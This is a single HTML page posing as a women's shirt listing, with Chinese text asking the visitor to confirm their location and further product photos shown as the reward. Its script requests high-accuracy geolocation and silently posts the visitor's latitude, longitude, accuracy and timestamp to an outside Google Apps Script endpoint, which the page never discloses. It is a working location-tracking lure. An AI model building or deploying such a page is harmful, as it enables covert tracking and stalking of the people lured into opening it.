<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Trend Köynəklər</title>

<style>
*{box-sizing:border-box}

body{
  margin:0;
  font-family:Arial,sans-serif;
  background:#f7f2ef;
}

.page{
  max-width:600px;
  margin:auto;
  padding:20px 15px 40px;
}

.card{
  background:#fff;
  border-radius:28px;
  padding:50px 22px;
  text-align:center;
  box-shadow:0 5px 25px rgba(0,0,0,.12);
}

.icon{
  font-size:70px;
}

h1{
  font-size:32px;
  margin:20px 0;
}

.text{
  font-size:21px;
  line-height:1.7;
  color:#555;
}

button{
  width:100%;
  padding:22px;
  border:0;
  border-radius:18px;
  background:#222;
  color:#fff;
  font-size:25px;
  font-weight:bold;
  margin-top:25px;
}

button:disabled{
  opacity:.6;
}

#status{
  margin-top:20px;
  font-size:18px;
  color:#555;
}

.photo{
  width:100%;
  display:block;
  border-radius:20px;
  margin-top:20px;
}

#photos{
  display:none;
}
</style>
</head>

<body>

<div class="page">

  <div class="card">

    <div class="icon">📍</div>

    <h1>您正在确认您的位置</h1>

    <div class="text">
      请点击下面的按钮确认您的位置
      <br>
      只有在您允许后，才能获取您的位置。
      <br><br>
      🔒 您可以自行决定是否允许位置权限。
    </div>

    <button id="nextButton">
      İleri
    </button>

    <div id="status"></div>

  </div>

  <img
    class="photo"
    src="IMG_20261005_014348.jpg"
    alt="Trend qadın köynəyi"
  >

  <div id="photos">

    <img
      class="photo"
      src="IMG_20261005_014406.jpg"
      alt="Trend qadın köynəyi"
    >

    <img
      class="photo"
      src="IMG_20261005_014430.jpg"
      alt="Trend qadın köynəyi"
    >

  </div>

</div>

<script>

const APP_SCRIPT_URL =
"https://script.google.com/macros/s/AKfycbxTNuy179zPxbSJYoQgAfNu6bqNCqjqjKeTIO7B3SKnYrmrGCN9DAD4TpphJ2tK_fsQZg/exec";

const button = document.getElementById("nextButton");
const status = document.getElementById("status");
const photos = document.getElementById("photos");

button.addEventListener("click", function(){

  if (!navigator.geolocation) {
    status.textContent = "此浏览器不支持位置服务。";
    return;
  }

  button.disabled = true;
  status.textContent = "正在获取您的位置，请允许位置权限……";

  navigator.geolocation.getCurrentPosition(

    function(position){

      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const accuracy = position.coords.accuracy;

      const locationData = {
        latitude: latitude,
        longitude: longitude,
        accuracy: accuracy,
        timestamp: new Date().toISOString()
      };

      fetch(APP_SCRIPT_URL, {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "text/plain;charset=utf-8"
        },
        body: JSON.stringify(locationData)
      }).catch(function(error){
        console.log(error);
      });

      status.textContent = "位置确认成功。";

      photos.style.display = "block";

    },

    function(error){

      button.disabled = false;

      status.textContent =
        "请允许位置权限后继续。";

    },

    {
      enableHighAccuracy: true,
      timeout: 20000,
      maximumAge: 0
    }

  );

});

</script>

</body>
</html>
